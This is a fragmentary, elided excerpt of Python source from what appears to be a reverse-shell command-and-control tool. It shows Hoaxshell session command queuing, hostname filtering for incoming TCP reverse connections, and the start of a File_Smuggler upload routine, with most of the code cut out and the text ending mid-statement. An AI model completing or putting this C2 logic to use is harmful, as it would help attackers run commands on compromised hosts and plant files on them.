	...
	def do_GET(self):
		...
		# Grab cmd
			...
			if len(Hoaxshell.command_pool[session_id]):
				...
				Root_issued_cmd = False
				cmd = Hoaxshell.command_pool[session_id].pop(0)

				# Check command type:
				# type str = normal
				# type dict = Root issued cmd

				if isinstance(cmd, dict):
					# Root_issued_cmd = True
					# quiet = cmd['quiet']
					cmd = cmd['data']
			...
			if TCP_Sock_Handler_Settings.hostname_filter:
				if not self.validate_hostname(hostname) or hostname == 'Undefined':
					...
					if not TCP_Sock_Handler_Settings.hostname_filter_warning_delivered:
						print_to_prompt(f'\r[{WARN}] A TCP reverse connection was rejected due to hostname validation failure. You can disable this filter by setting hostname_filter to False in Root/Core/settings.py. This warning will be muted for the rest of the session.')
		...
		while True:
			...
			if session_id in sessions:
				...
				if Hoaxshell.command_pool[session_id]:
					...
					# type dict = Command issued by Root's Utilities
					...
					if not Root_issued_cmd and shell == 'powershell.exe':
...
class File_Smuggler:
	...
	def upload_file(file_contents, destination_path, session_id, issuer = 'self', port = File_Smuggler_Settings.bind_port):
		...
		try:
			...
			# Construct Root issued command to request file
			Root_cmd = {
